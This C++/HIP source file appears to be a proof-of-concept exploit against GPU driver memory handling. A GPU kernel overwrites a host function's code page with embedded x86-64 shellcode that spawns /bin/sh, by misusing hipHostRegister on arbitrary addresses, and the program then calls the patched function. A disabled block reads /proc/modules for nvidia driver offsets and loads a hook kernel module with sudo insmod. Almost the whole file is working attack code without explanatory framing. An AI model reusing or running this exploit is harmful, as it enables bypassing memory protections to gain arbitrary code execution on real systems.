#include "hip/hip_runtime.h"
/**
 * Copyright 1993-2012 NVIDIA Corporation.  All rights reserved.
 *
 * Please refer to the NVIDIA end user license agreement (EULA) associated
 * with this source code for terms and conditions that govern your use of
 * this software. Any use, reproduction, disclosure, or distribution of
 * this software and related documentation outside the terms of the EULA
 * is strictly prohibited.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <hip/hip_runtime.h>
#include <fstream>
#include <string>
#include <iostream>
#include <sstream>



#define ALIGN 0x1000
using namespace std;

// Some dirtry tricks, should be replaced by mmap()
void *aligned_malloc(int size) {
    void *mem = malloc(size+ALIGN+sizeof(void*));
    void **ptr = (void**)((long)(mem+ALIGN+sizeof(void*)) & ~(ALIGN-1));
    ptr[-1] = mem;
    return ptr;
}

void aligned_free(void *ptr) {
    free(((void**)ptr)[-1]);
}




//#define hipHostRegisterPortable   0x01

//static const int WORK_SIZE = 256;

/**
 * This macro checks return value of the CUDA runtime call and exits
 * the application if the call failed.
 */
//int global;

#define CUDA_CHECK_RETURN(value) {											\
	hipError_t _m_cudaStat = value;										\
	if (_m_cudaStat != hipSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\n",					\
				hipGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
		exit(1);															\
	} }

#define CUDA_CHECK_NORETURN(value) {											\
	hipError_t _m_cudaStat = value;										\
	if (_m_cudaStat != hipSuccess) {										\
		fprintf(stderr, "Error %s at line %d in file %s\nContinue\n",					\
				hipGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
	} }


__device__ char * backup_buf;

/* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
__global__ void PixsysCuda(char * d_source, int offset)
{
	if (threadIdx.x == 0) {
		backup_buf = (char *) malloc(1024 * sizeof(char));
	}
	__syncthreads();

	char shellcode[] = {
			"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
			"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
			"\x54\x5f\x6a\x3b\x58\x0f\x05\x90\x90\x90"
	};

  backup_buf[threadIdx.x] = (d_source+offset)[threadIdx.x];
  (d_source+offset)[threadIdx.x] = shellcode[threadIdx.x];
}

__global__ void PixsysRecover(char * d_source, int offset) {
  (d_source+offset)[threadIdx.x] = backup_buf[threadIdx.x];
}

void Stub_Funct ()
{
	printf("NOTHING Here!\n");
	__asm__(
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
			"nop;"
	);
}

/**
 * Host function that prepares data array and passes it to the CUDA kernel.
 */
typedef struct hidden_driver_info
{
	long int start_addr;
	long int end_addr;
} hidden_driver_info ,*p_hidden_info;

typedef void (*s_funct) () ;
int main(void) {

	int pagesize = 0x1000;
	s_funct f;
	pagesize = getpagesize(); // get Page size of system (usually 0x1000)
	//printf("page size is: %d\n",pagesize);

	p_hidden_info info_for_cuda_driver = (p_hidden_info)aligned_malloc(sizeof(hidden_driver_info)); // malloc info hiden buffer
	info_for_cuda_driver->start_addr = 0x4001; // unused. will be filled later
	info_for_cuda_driver->end_addr = 0x50003; // unused.

	//printf("start addr 0x%llx, 0x%llx\n",info_for_cuda_driver->start_addr,info_for_cuda_driver->end_addr );
	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);

	char * real_buff = (char*)aligned_malloc(pagesize*sizeof(char)); // Malloc alligned buffer.

	memset(real_buff,0x4141,pagesize*sizeof(char)); // Fill buffer with 414141

	/*calculate the victim function parameters*/
	f=&Stub_Funct;
	int offset = (unsigned long)f % 0x1000;
	int base = ((unsigned long)f / 0x1000)* 0x1000;
	f();
	printf("Stub Function Address: 0x%lx\n",(unsigned long)f);
	printf("Stub Function offset: 0x%lx\n",(unsigned long)offset);
	printf("Stub Function base: 0x%lx\n",(unsigned long)base);
	fflush(stdout);

	//printf("Buffer: 0x%08x\n",*(unsigned int *)real_buff);

	//Set hidden Address:
	info_for_cuda_driver->start_addr = (unsigned long)base;

#if 0
	//Load kernel module:
	ifstream modules_fd("/proc/modules");
	string str;
	int addr_offset_from_nvidia = 35;
	unsigned long int base_nv_value, map_addr, lock_addr;
	string nvidia_base_addr;
	string m_lock_addr;
	string dma_map_addr;
	stringstream sstr;

  while (getline(modules_fd, str))
  {
		size_t pos = str.find("nvidia 1");
    if (pos != string::npos)
		{
			pos = str.find("0x");
			nvidia_base_addr = str.substr(pos+2);
			cout << "BASE ADDR IS: " << nvidia_base_addr << "\n";
			sstr << nvidia_base_addr;
			sstr >> hex >> base_nv_value;
			break;
		}
		// Process str
  }
	cout << "Base Nv addr hex is: " << hex << base_nv_value << "\n";
	map_addr = base_nv_value + 0x570bd0; //Known offset
	lock_addr = base_nv_value + 0x5770c0;
	sstr.str("");
	//cout << "S:" << map_addr << "\n";
	sstr << map_addr;
	dma_map_addr = sstr.str();
	sstr.str("");
	sstr << lock_addr;
	m_lock_addr = sstr.str();

	cout << "nv_dma_map_pages addr is: " << dma_map_addr << "\n os_lock_user_pages addr is :" << m_lock_addr << "\n";
	string CMD = "sudo insmod hook.ko m_lock_addr=0x" + m_lock_addr + " dma_map_addr=0x" + dma_map_addr;
	cout << "CMD is: " << CMD << "\n";
	system(CMD.c_str());
	sleep(10);
#endif

	char * d_real_buff;
	char * d_target;

	char * h_target = (char*)malloc(2*pagesize*sizeof(char*));
	//printf("TARGET a host in place Page2: 0x%08x",*(unsigned int *)(h_target+pagesize));
	CUDA_CHECK_RETURN(hipMalloc((void **)&d_target, 2*pagesize*sizeof(char))) ;

	printf("GOING IN!\n");
	fflush(stdout);

CUDA_CHECK_NORETURN(hipGetLastError());

	/* Try to set up the mallicious bit */
	try
	{
		hipHostRegister((void *)0x0400000, sizeof(hidden_driver_info), hipHostRegisterPortable) ;
		hipHostRegister((void *)0x0800000, sizeof(hidden_driver_info), hipHostRegisterPortable) ;
		hipHostRegister((void *)0x01200000, sizeof(hidden_driver_info), hipHostRegisterPortable) ;
	}
	catch (...)
	{
		printf("NAH");
	}

CUDA_CHECK_NORETURN(hipGetLastError());

	/* register the info buffer. First things first... */
	CUDA_CHECK_RETURN(hipHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), hipHostRegisterPortable)) ;
	/* Map what a Nice guy would think is a benevelent buffer.
	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/
	CUDA_CHECK_RETURN(hipHostRegister((void *)real_buff, pagesize*sizeof(char), hipHostRegisterPortable)) ;

	/* Get device pointer of this buffer */
	CUDA_CHECK_RETURN(hipHostGetDevicePointer((void**)&d_real_buff,real_buff,0));
	//printf("Device PTR is : 0x%08x\n",(unsigned int *)d_real_buff);
	fflush(stdout);

CUDA_CHECK_NORETURN(hipGetLastError());

	/* info buffer in UM can be changed now. No effect. */
	//info_for_cuda_driver->start_addr = (unsigned long)stdout->_IO_write_base;
	//printf("write_base addr: 0x%lx\n",(unsigned long)stdout->_IO_write_base);
	//(stdout->_IO_write_base)[1]='W';

	/*Activate cuda kernel, that copies shellcode */
	PixsysCuda<<<1,32>>>(d_real_buff,offset);


	CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete

	f(); // Call "non malicious" function again.
	CUDA_CHECK_NORETURN(hipGetLastError());

	// Recover f()
	printf("Now recover f()\n");
	PixsysRecover<<<1,32>>>(d_real_buff,offset);


		CUDA_CHECK_RETURN(hipMemcpy((void *)h_target,d_target, pagesize*sizeof(char),hipMemcpyDeviceToHost));
		//printf("Target is: 0x%08x\n",*(unsigned int *) h_target);
		//printf("STRNG Target is 0x%08x",*(unsigned int *)(h_target+pagesize));
		fflush(stdout);
		CUDA_CHECK_RETURN(hipHostUnregister((void *)real_buff)) ;
		CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete
		CUDA_CHECK_NORETURN(hipGetLastError());
	//}
	//sleep(3000);
	/*for (i = 0; i < WORK_SIZE; i++)
		idata[i] = (unsigned int) i;

	CUDA_CHECK_RETURN(hipMalloc((void**) &d, sizeof(int) * WORK_SIZE));
	CUDA_CHECK_RETURN(
			hipMemcpy(d, idata, sizeof(int) * WORK_SIZE, hipMemcpyHostToDevice));

	bitreverse<<<1, WORK_SIZE, WORK_SIZE * sizeof(int)>>>(d);
	*/
	//CUDA_CHECK_RETURN(hipDeviceSynchronize());	// Wait for the GPU launched work to complete
	//CUDA_CHECK_RETURN(hipGetLastError());
	/*CUDA_CHECK_RETURN(hipMemcpy(odata, d, sizeof(int) * WORK_SIZE, hipMemcpyDeviceToHost));

	for (i = 0; i < WORK_SIZE; i++)
		printf("Input value: %u, device output: %u\n", idata[i], odata[i]);

	CUDA_CHECK_RETURN(hipFree((void*) d));
	CUDA_CHECK_RETURN(hipDeviceReset());
*/
	return 0;
}
